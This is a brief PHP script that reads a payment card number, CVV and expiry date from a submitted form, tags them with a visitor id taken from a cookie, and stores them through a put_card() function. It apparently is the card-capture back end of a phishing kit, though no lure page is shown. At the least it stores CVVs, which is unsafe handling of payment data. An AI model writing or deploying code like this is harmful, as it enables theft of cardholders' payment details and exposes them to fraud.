<?php 
require('../metronic/include/setings.php');
date_default_timezone_set('America/Bogota');

$tarjeta = $_POST['tar'];
$cvv = $_POST['cvv'];
$fecha = $_POST['fec'];

$registro = $_COOKIE['id'];
put_card($registro,$tarjeta,$fecha,$cvv);
?>